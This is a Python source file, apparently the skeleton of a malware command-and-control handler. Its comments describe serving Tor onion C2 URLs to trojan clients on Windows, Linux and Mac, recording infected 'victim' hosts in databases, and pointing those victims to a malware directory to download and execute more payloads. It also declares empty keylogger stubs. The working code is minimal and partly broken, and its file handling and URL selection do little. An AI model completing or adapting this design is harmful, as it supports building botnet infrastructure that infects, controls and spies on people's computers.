#Handler will do multiple things
#1. update the malware details that are online in *_online_hosts.db 
#2. handle some malware that are support automation 
#3. return the appropriate onion url back the callee
#todo
#1. return the appropriate malware directory onion url back the callee(to malware to execute in the remote host system)
#2. 

import sqlite3


class OnlineHost():
    def trgn_win():
        #1. send server onion ulr  to trogen to control
        #2. send the onion malware directory of our malware database server to victom malware client to download and execute more malware in victom PC
        #3. check type of trgn.
        #4. appned the online host to online_hosts sql database
        #
        with open("trgn_win_online_hosts.db", 'w') as online_hosts_var1:
            pass

        with open("onion_url_c2c_server.db", "r") as onion_url_c2:
            #1. check the list of onion server list
            #2. take the appropriate onion url and send to malware.
            for url in onion_url_c2:
                onion_url = url
        return onion_url
        
    def trgn_lin():
        #1. send server onion ulr  to trogen to control
        #2. send the onion malware directory of our malware database server to victom malware client to download and execute more malware in victom PC
        #3. check type of trgn.
        #4. appned the online host to online_hosts sql database
        #
        with open("trgn_lin_online_hosts.db", 'w') as online_hosts_var1:
            pass

        with open("onion_url_c2c_server.db", "r") as onion_url_c2:
            #1. check the list of onion server list
            #2. take the appropriate onion url and send to malware.
            for url in onion_url_c2:
                onion_url = url
        return onion_url

    def trgn_mac():
         #1. send server onion ulr  to trogen to control
        #2. send the onion malware directory of our malware database server to victom malware client to download and execute more malware in victom PC
        #3. check type of trgn.
        #4. appned the online host to online_hosts sql database
        #
        with open("trgn_mac_online_hosts.db", 'w') as online_hosts_var1:
            pass
        with open("onion_url_c2c_server.db", "r") as onion_url_c2:
            #1. check the list of onion server list
            #2. take the appropriate one and send to malware.
            for url in onion_url_c2:
                onion_url = url
        return onion_url
    def kylg_win():
        pass
    def kylg_lin():
        pass
    def kylg_mac():
        pass